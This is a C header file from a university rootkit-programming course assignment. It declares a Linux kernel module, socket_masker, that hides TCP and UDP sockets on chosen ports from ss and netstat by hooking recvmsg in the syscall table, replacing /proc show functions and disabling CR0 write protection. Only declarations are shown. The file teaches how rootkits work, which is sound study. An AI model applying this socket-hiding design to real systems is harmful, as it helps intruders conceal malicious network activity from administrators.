
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 6                                                             */
/*                                                                             */
/*   Filename: socket_masker.h                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: Header file for kernel module `socket_masker.c`.                   */
/*                                                                             */
/*******************************************************************************/

#ifndef __SOCKET_MASKER__
#define __SOCKET_MASKER__


/* Definition of macros */
#define PORTS_BUFFSIZE 8
#define PRINT(str) printk(KERN_INFO "socket_masker rootkit: %s\n", (str))
#define CR0_WRITE_PROTECT_MASK (1 << 16)


/* Definition of global variables */
static int tcp4_ports[PORTS_BUFFSIZE];
static int tcp4_ports_count;
static int tcp6_ports[PORTS_BUFFSIZE];
static int tcp6_ports_count;
static int udp4_ports[PORTS_BUFFSIZE];
static int udp4_ports_count;
static int udp6_ports[PORTS_BUFFSIZE];
static int udp6_ports_count;
static void **syscall_table;
asmlinkage ssize_t (*original_recvmsg_syscall)(int, struct user_msghdr __user *, unsigned);
asmlinkage int (*original_tcp4_show) (struct seq_file *, void *);
asmlinkage int (*original_tcp6_show) (struct seq_file *, void *);
asmlinkage int (*original_udp4_show) (struct seq_file *, void *);
asmlinkage int (*original_udp6_show) (struct seq_file *, void *);


/* Declaration of functions */
static int invalid_ports_found(int *, int);

static void mask_sockets_from_ss(void);
static void unmask_sockets_from_ss(void);
static void mask_sockets_from_netstat(void);
static void unmask_sockets_from_netstat(void);

static void disable_write_protect_mode(void);
static void enable_write_protect_mode(void);

asmlinkage ssize_t my_recvmsg_syscall(int, struct user_msghdr __user *, unsigned);
static int data_should_be_masked(struct nlmsghdr *);

static int my_tcp4_show(struct seq_file *, void *);
static int my_tcp6_show(struct seq_file *, void *);
static int my_udp4_show(struct seq_file *, void *);
static int my_udp6_show(struct seq_file *, void *);

static int should_mask_socket(char *, int);


/* Definition of structs */
/*****************************************************************************/
/*                                                                           */
/*          CODE BELOW IS TAKEN FROM fs/proc/internal.h, lines 21-52         */
/*                                                                           */
/*****************************************************************************/

/*
 * This is not completely implemented yet. The idea is to
 * create an in-memory tree (like the actual /proc filesystem
 * tree) of these proc_dir_entries, so that we can dynamically
 * add new files to /proc.
 *
 * parent/subdir are used for the directory structure (every /proc file has a
 * parent, but "subdir" is empty for all non-directory entries).
 * subdir_node is used to build the rb tree "subdir" of the parent.
 */
struct proc_dir_entry {
		unsigned int low_ino;
		umode_t mode;
		nlink_t nlink;
		kuid_t uid;
		kgid_t gid;
		loff_t size;
		const struct inode_operations *proc_iops;
		const struct file_operations *proc_fops;
		struct proc_dir_entry *parent;
		struct rb_root subdir;
		struct rb_node subdir_node;
		void *data;
		atomic_t count;         /* use count */
		atomic_t in_use;        /* number of callers into module in progress; */
								/* negative -> it's going away RSN */
		struct completion *pde_unload_completion;
		struct list_head pde_openers;   /* who did ->open, but not ->release */
		spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
		u8 namelen;
		char name[];
};

#endif
